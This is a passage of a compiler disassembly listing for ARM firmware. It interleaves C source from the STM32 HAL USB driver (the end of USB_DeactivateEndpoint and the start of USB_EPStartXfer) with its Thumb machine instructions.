 8006ac6:	85bb      	strh	r3, [r7, #44]	; 0x2c
 8006ac8:	687a      	ldr	r2, [r7, #4]
 8006aca:	683b      	ldr	r3, [r7, #0]
 8006acc:	781b      	ldrb	r3, [r3, #0]
 8006ace:	009b      	lsls	r3, r3, #2
 8006ad0:	441a      	add	r2, r3
 8006ad2:	8dbb      	ldrh	r3, [r7, #44]	; 0x2c
 8006ad4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006ad8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006adc:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006ae0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006ae4:	b29b      	uxth	r3, r3
 8006ae6:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006ae8:	687a      	ldr	r2, [r7, #4]
 8006aea:	683b      	ldr	r3, [r7, #0]
 8006aec:	781b      	ldrb	r3, [r3, #0]
 8006aee:	009b      	lsls	r3, r3, #2
 8006af0:	4413      	add	r3, r2
 8006af2:	881b      	ldrh	r3, [r3, #0]
 8006af4:	857b      	strh	r3, [r7, #42]	; 0x2a
 8006af6:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8006af8:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006afc:	2b00      	cmp	r3, #0
 8006afe:	d01b      	beq.n	8006b38 <USB_DeactivateEndpoint+0x324>
 8006b00:	687a      	ldr	r2, [r7, #4]
 8006b02:	683b      	ldr	r3, [r7, #0]
 8006b04:	781b      	ldrb	r3, [r3, #0]
 8006b06:	009b      	lsls	r3, r3, #2
 8006b08:	4413      	add	r3, r2
 8006b0a:	881b      	ldrh	r3, [r3, #0]
 8006b0c:	b29b      	uxth	r3, r3
 8006b0e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b12:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006b16:	853b      	strh	r3, [r7, #40]	; 0x28
 8006b18:	687a      	ldr	r2, [r7, #4]
 8006b1a:	683b      	ldr	r3, [r7, #0]
 8006b1c:	781b      	ldrb	r3, [r3, #0]
 8006b1e:	009b      	lsls	r3, r3, #2
 8006b20:	441a      	add	r2, r3
 8006b22:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 8006b24:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b28:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b2c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006b30:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006b34:	b29b      	uxth	r3, r3
 8006b36:	8013      	strh	r3, [r2, #0]
      PCD_RX_DTOG(USBx, ep->num);
 8006b38:	687a      	ldr	r2, [r7, #4]
 8006b3a:	683b      	ldr	r3, [r7, #0]
 8006b3c:	781b      	ldrb	r3, [r3, #0]
 8006b3e:	009b      	lsls	r3, r3, #2
 8006b40:	4413      	add	r3, r2
 8006b42:	881b      	ldrh	r3, [r3, #0]
 8006b44:	b29b      	uxth	r3, r3
 8006b46:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b4a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006b4e:	84fb      	strh	r3, [r7, #38]	; 0x26
 8006b50:	687a      	ldr	r2, [r7, #4]
 8006b52:	683b      	ldr	r3, [r7, #0]
 8006b54:	781b      	ldrb	r3, [r3, #0]
 8006b56:	009b      	lsls	r3, r3, #2
 8006b58:	441a      	add	r2, r3
 8006b5a:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 8006b5c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b60:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b64:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006b68:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006b6c:	b29b      	uxth	r3, r3
 8006b6e:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint*/
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006b70:	687a      	ldr	r2, [r7, #4]
 8006b72:	683b      	ldr	r3, [r7, #0]
 8006b74:	781b      	ldrb	r3, [r3, #0]
 8006b76:	009b      	lsls	r3, r3, #2
 8006b78:	4413      	add	r3, r2
 8006b7a:	881b      	ldrh	r3, [r3, #0]
 8006b7c:	b29b      	uxth	r3, r3
 8006b7e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b82:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006b86:	84bb      	strh	r3, [r7, #36]	; 0x24
 8006b88:	687a      	ldr	r2, [r7, #4]
 8006b8a:	683b      	ldr	r3, [r7, #0]
 8006b8c:	781b      	ldrb	r3, [r3, #0]
 8006b8e:	009b      	lsls	r3, r3, #2
 8006b90:	441a      	add	r2, r3
 8006b92:	8cbb      	ldrh	r3, [r7, #36]	; 0x24
 8006b94:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b98:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b9c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006ba0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006ba4:	b29b      	uxth	r3, r3
 8006ba6:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006ba8:	687a      	ldr	r2, [r7, #4]
 8006baa:	683b      	ldr	r3, [r7, #0]
 8006bac:	781b      	ldrb	r3, [r3, #0]
 8006bae:	009b      	lsls	r3, r3, #2
 8006bb0:	4413      	add	r3, r2
 8006bb2:	881b      	ldrh	r3, [r3, #0]
 8006bb4:	b29b      	uxth	r3, r3
 8006bb6:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006bba:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006bbe:	847b      	strh	r3, [r7, #34]	; 0x22
 8006bc0:	687a      	ldr	r2, [r7, #4]
 8006bc2:	683b      	ldr	r3, [r7, #0]
 8006bc4:	781b      	ldrb	r3, [r3, #0]
 8006bc6:	009b      	lsls	r3, r3, #2
 8006bc8:	441a      	add	r2, r3
 8006bca:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006bcc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006bd0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006bd4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006bd8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006bdc:	b29b      	uxth	r3, r3
 8006bde:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 8006be0:	2300      	movs	r3, #0
}
 8006be2:	4618      	mov	r0, r3
 8006be4:	3734      	adds	r7, #52	; 0x34
 8006be6:	46bd      	mov	sp, r7
 8006be8:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006bec:	4770      	bx	lr

08006bee <USB_EPStartXfer>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPStartXfer(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006bee:	b580      	push	{r7, lr}
 8006bf0:	b0c2      	sub	sp, #264	; 0x108
 8006bf2:	af00      	add	r7, sp, #0
 8006bf4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bf8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bfc:	6018      	str	r0, [r3, #0]
 8006bfe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c02:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c06:	6019      	str	r1, [r3, #0]
  uint16_t pmabuffer;
  uint16_t wEPVal;
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  /* IN endpoint */
  if (ep->is_in == 1U)
 8006c08:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c0c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c10:	681b      	ldr	r3, [r3, #0]
 8006c12:	785b      	ldrb	r3, [r3, #1]
 8006c14:	2b01      	cmp	r3, #1
 8006c16:	f040 86b7 	bne.w	8007988 <USB_EPStartXfer+0xd9a>
  {
    /*Multi packet transfer*/
    if (ep->xfer_len > ep->maxpacket)
 8006c1a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c1e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c22:	681b      	ldr	r3, [r3, #0]
 8006c24:	699a      	ldr	r2, [r3, #24]
 8006c26:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c2a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c2e:	681b      	ldr	r3, [r3, #0]
 8006c30:	691b      	ldr	r3, [r3, #16]
 8006c32:	429a      	cmp	r2, r3
 8006c34:	d908      	bls.n	8006c48 <USB_EPStartXfer+0x5a>
    {
      len = ep->maxpacket;
 8006c36:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c3a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c3e:	681b      	ldr	r3, [r3, #0]
 8006c40:	691b      	ldr	r3, [r3, #16]
 8006c42:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
 8006c46:	e007      	b.n	8006c58 <USB_EPStartXfer+0x6a>
    }
    else
    {
      len = ep->xfer_len;
 8006c48:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c4c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c50:	681b      	ldr	r3, [r3, #0]
 8006c52:	699b      	ldr	r3, [r3, #24]
 8006c54:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
    }

    /* configure and validate Tx endpoint */
    if (ep->doublebuffer == 0U)
 8006c58:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c5c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c60:	681b      	ldr	r3, [r3, #0]
 8006c62:	7b1b      	ldrb	r3, [r3, #12]
 8006c64:	2b00      	cmp	r3, #0
 8006c66:	d13a      	bne.n	8006cde <USB_EPStartXfer+0xf0>
    {
      USB_WritePMA(USBx, ep->xfer_buff, ep->pmaadress, (uint16_t)len);
 8006c68:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c6c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c70:	681b      	ldr	r3, [r3, #0]
 8006c72:	6959      	ldr	r1, [r3, #20]
 8006c74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c78:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c7c:	681b      	ldr	r3, [r3, #0]
 8006c7e:	88da      	ldrh	r2, [r3, #6]
 8006c80:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c84:	b29b      	uxth	r3, r3
 8006c86:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006c8a:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006c8e:	6800      	ldr	r0, [r0, #0]
 8006c90:	f001 fcb9 	bl	8008606 <USB_WritePMA>
      PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8006c94:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c98:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c9c:	681b      	ldr	r3, [r3, #0]
 8006c9e:	613b      	str	r3, [r7, #16]
 8006ca0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ca4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ca8:	681b      	ldr	r3, [r3, #0]
 8006caa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006cae:	b29b      	uxth	r3, r3
 8006cb0:	461a      	mov	r2, r3
 8006cb2:	693b      	ldr	r3, [r7, #16]
 8006cb4:	4413      	add	r3, r2
 8006cb6:	613b      	str	r3, [r7, #16]
 8006cb8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cbc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cc0:	681b      	ldr	r3, [r3, #0]
 8006cc2:	781b      	ldrb	r3, [r3, #0]
 8006cc4:	00da      	lsls	r2, r3, #3
 8006cc6:	693b      	ldr	r3, [r7, #16]
 8006cc8:	4413      	add	r3, r2
 8006cca:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006cce:	60fb      	str	r3, [r7, #12]
 8006cd0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cd4:	b29a      	uxth	r2, r3
 8006cd6:	68fb      	ldr	r3, [r7, #12]
 8006cd8:	801a      	strh	r2, [r3, #0]
 8006cda:	f000 be1f 	b.w	800791c <USB_EPStartXfer+0xd2e>
    }
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* double buffer bulk management */
      if (ep->type == EP_TYPE_BULK)
 8006cde:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ce2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ce6:	681b      	ldr	r3, [r3, #0]
 8006ce8:	78db      	ldrb	r3, [r3, #3]
 8006cea:	2b02      	cmp	r3, #2
 8006cec:	f040 8462 	bne.w	80075b4 <USB_EPStartXfer+0x9c6>
      {
        if (ep->xfer_len_db > ep->maxpacket)
 8006cf0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cf4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cf8:	681b      	ldr	r3, [r3, #0]
 8006cfa:	6a1a      	ldr	r2, [r3, #32]
 8006cfc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d00:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d04:	681b      	ldr	r3, [r3, #0]
 8006d06:	691b      	ldr	r3, [r3, #16]
 8006d08:	429a      	cmp	r2, r3
 8006d0a:	f240 83df 	bls.w	80074cc <USB_EPStartXfer+0x8de>
        {
          /* enable double buffer */
          PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006d0e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d12:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d16:	681a      	ldr	r2, [r3, #0]
 8006d18:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d1c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d20:	681b      	ldr	r3, [r3, #0]
 8006d22:	781b      	ldrb	r3, [r3, #0]
 8006d24:	009b      	lsls	r3, r3, #2
 8006d26:	4413      	add	r3, r2
 8006d28:	881b      	ldrh	r3, [r3, #0]
 8006d2a:	b29b      	uxth	r3, r3
 8006d2c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006d30:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006d34:	f8a7 3056 	strh.w	r3, [r7, #86]	; 0x56
 8006d38:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d3c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d40:	681a      	ldr	r2, [r3, #0]
 8006d42:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d46:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d4a:	681b      	ldr	r3, [r3, #0]
 8006d4c:	781b      	ldrb	r3, [r3, #0]
 8006d4e:	009b      	lsls	r3, r3, #2
 8006d50:	441a      	add	r2, r3
 8006d52:	f8b7 3056 	ldrh.w	r3, [r7, #86]	; 0x56
 8006d56:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006d5a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006d5e:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006d62:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006d66:	b29b      	uxth	r3, r3
 8006d68:	8013      	strh	r3, [r2, #0]

          /* each Time to write in PMA xfer_len_db will */
          ep->xfer_len_db -= len;
 8006d6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d6e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d72:	681b      	ldr	r3, [r3, #0]
 8006d74:	6a1a      	ldr	r2, [r3, #32]
 8006d76:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d7a:	1ad2      	subs	r2, r2, r3
 8006d7c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d80:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d84:	681b      	ldr	r3, [r3, #0]
 8006d86:	621a      	str	r2, [r3, #32]

          /* Fill the two first buffer in the Buffer0 & Buffer1 */
          if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 8006d88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d8c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d90:	681a      	ldr	r2, [r3, #0]
 8006d92:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d96:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d9a:	681b      	ldr	r3, [r3, #0]
 8006d9c:	781b      	ldrb	r3, [r3, #0]
 8006d9e:	009b      	lsls	r3, r3, #2
 8006da0:	4413      	add	r3, r2
 8006da2:	881b      	ldrh	r3, [r3, #0]
 8006da4:	b29b      	uxth	r3, r3
 8006da6:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006daa:	2b00      	cmp	r3, #0
 8006dac:	f000 81c7 	beq.w	800713e <USB_EPStartXfer+0x550>
          {
            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8006db0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006db4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006db8:	681b      	ldr	r3, [r3, #0]
 8006dba:	633b      	str	r3, [r7, #48]	; 0x30
 8006dbc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dc0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dc4:	681b      	ldr	r3, [r3, #0]
 8006dc6:	785b      	ldrb	r3, [r3, #1]
 8006dc8:	2b00      	cmp	r3, #0
 8006dca:	d177      	bne.n	8006ebc <USB_EPStartXfer+0x2ce>
 8006dcc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dd0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006dd4:	681b      	ldr	r3, [r3, #0]
 8006dd6:	62bb      	str	r3, [r7, #40]	; 0x28
 8006dd8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ddc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006de0:	681b      	ldr	r3, [r3, #0]
 8006de2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006de6:	b29b      	uxth	r3, r3
 8006de8:	461a      	mov	r2, r3
 8006dea:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006dec:	4413      	add	r3, r2
 8006dee:	62bb      	str	r3, [r7, #40]	; 0x28
 8006df0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006df4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006df8:	681b      	ldr	r3, [r3, #0]
 8006dfa:	781b      	ldrb	r3, [r3, #0]
 8006dfc:	00da      	lsls	r2, r3, #3
 8006dfe:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006e00:	4413      	add	r3, r2
 8006e02:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006e06:	627b      	str	r3, [r7, #36]	; 0x24
 8006e08:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e0a:	881b      	ldrh	r3, [r3, #0]
 8006e0c:	b29b      	uxth	r3, r3
 8006e0e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006e12:	b29a      	uxth	r2, r3
 8006e14:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e16:	801a      	strh	r2, [r3, #0]
 8006e18:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e1c:	2b3e      	cmp	r3, #62	; 0x3e
 8006e1e:	d921      	bls.n	8006e64 <USB_EPStartXfer+0x276>
 8006e20:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e24:	095b      	lsrs	r3, r3, #5
 8006e26:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006e2a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e2e:	f003 031f 	and.w	r3, r3, #31
 8006e32:	2b00      	cmp	r3, #0
 8006e34:	d104      	bne.n	8006e40 <USB_EPStartXfer+0x252>
 8006e36:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006e3a:	3b01      	subs	r3, #1
 8006e3c:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006e40:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e42:	881b      	ldrh	r3, [r3, #0]
 8006e44:	b29a      	uxth	r2, r3
 8006e46:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006e4a:	b29b      	uxth	r3, r3
 8006e4c:	029b      	lsls	r3, r3, #10
 8006e4e:	b29b      	uxth	r3, r3
 8006e50:	4313      	orrs	r3, r2
 8006e52:	b29b      	uxth	r3, r3
 8006e54:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006e58:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006e5c:	b29a      	uxth	r2, r3
 8006e5e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e60:	801a      	strh	r2, [r3, #0]
 8006e62:	e050      	b.n	8006f06 <USB_EPStartXfer+0x318>
 8006e64:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e68:	2b00      	cmp	r3, #0
 8006e6a:	d10a      	bne.n	8006e82 <USB_EPStartXfer+0x294>
 8006e6c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e6e:	881b      	ldrh	r3, [r3, #0]
 8006e70:	b29b      	uxth	r3, r3
 8006e72:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006e76:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006e7a:	b29a      	uxth	r2, r3
 8006e7c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006e7e:	801a      	strh	r2, [r3, #0]
 8006e80:	e041      	b.n	8006f06 <USB_EPStartXfer+0x318>
 8006e82:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e86:	085b      	lsrs	r3, r3, #1
 8006e88:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006e8c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e90:	f003 0301 	and.w	r3, r3, #1
 8006e94:	2b00      	cmp	r3, #0
 8006e96:	d004      	beq.n	8006ea2 <USB_EPStartXfer+0x2b4>
 8006e98:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006e9c:	3301      	adds	r3, #1
 8006e9e:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006ea2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006ea4:	881b      	ldrh	r3, [r3, #0]
 8006ea6:	b29a      	uxth	r2, r3
 8006ea8:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006eac:	b29b      	uxth	r3, r3
 8006eae:	029b      	lsls	r3, r3, #10
 8006eb0:	b29b      	uxth	r3, r3
 8006eb2:	4313      	orrs	r3, r2
 8006eb4:	b29a      	uxth	r2, r3
 8006eb6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006eb8:	801a      	strh	r2, [r3, #0]
 8006eba:	e024      	b.n	8006f06 <USB_EPStartXfer+0x318>
 8006ebc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ec0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ec4:	681b      	ldr	r3, [r3, #0]
 8006ec6:	785b      	ldrb	r3, [r3, #1]
 8006ec8:	2b01      	cmp	r3, #1
 8006eca:	d11c      	bne.n	8006f06 <USB_EPStartXfer+0x318>
 8006ecc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ed0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ed4:	681b      	ldr	r3, [r3, #0]
 8006ed6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006eda:	b29b      	uxth	r3, r3
 8006edc:	461a      	mov	r2, r3
 8006ede:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006ee0:	4413      	add	r3, r2
 8006ee2:	633b      	str	r3, [r7, #48]	; 0x30
 8006ee4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ee8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006eec:	681b      	ldr	r3, [r3, #0]
 8006eee:	781b      	ldrb	r3, [r3, #0]
 8006ef0:	00da      	lsls	r2, r3, #3
 8006ef2:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006ef4:	4413      	add	r3, r2
 8006ef6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006efa:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006efc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f00:	b29a      	uxth	r2, r3
 8006f02:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8006f04:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8006f06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f0a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f0e:	681b      	ldr	r3, [r3, #0]
 8006f10:	895b      	ldrh	r3, [r3, #10]
 8006f12:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006f16:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f1a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f1e:	681b      	ldr	r3, [r3, #0]
 8006f20:	6959      	ldr	r1, [r3, #20]
 8006f22:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f26:	b29b      	uxth	r3, r3
 8006f28:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006f2c:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006f30:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006f34:	6800      	ldr	r0, [r0, #0]
 8006f36:	f001 fb66 	bl	8008606 <USB_WritePMA>
            ep->xfer_buff += len;
 8006f3a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f3e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f42:	681b      	ldr	r3, [r3, #0]
 8006f44:	695a      	ldr	r2, [r3, #20]
 8006f46:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f4a:	441a      	add	r2, r3
 8006f4c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f50:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f54:	681b      	ldr	r3, [r3, #0]
 8006f56:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8006f58:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f5c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f60:	681b      	ldr	r3, [r3, #0]
 8006f62:	6a1a      	ldr	r2, [r3, #32]
 8006f64:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f68:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f6c:	681b      	ldr	r3, [r3, #0]
 8006f6e:	691b      	ldr	r3, [r3, #16]
 8006f70:	429a      	cmp	r2, r3
 8006f72:	d90f      	bls.n	8006f94 <USB_EPStartXfer+0x3a6>
            {
              ep->xfer_len_db -= len;
 8006f74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f78:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f7c:	681b      	ldr	r3, [r3, #0]
 8006f7e:	6a1a      	ldr	r2, [r3, #32]
 8006f80:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f84:	1ad2      	subs	r2, r2, r3
 8006f86:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f8a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f8e:	681b      	ldr	r3, [r3, #0]
 8006f90:	621a      	str	r2, [r3, #32]
 8006f92:	e00e      	b.n	8006fb2 <USB_EPStartXfer+0x3c4>
            }
            else
            {
              len = ep->xfer_len_db;
 8006f94:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f98:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f9c:	681b      	ldr	r3, [r3, #0]
 8006f9e:	6a1b      	ldr	r3, [r3, #32]
 8006fa0:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8006fa4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fa8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fac:	681b      	ldr	r3, [r3, #0]
 8006fae:	2200      	movs	r2, #0
 8006fb0:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006fb2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fb6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
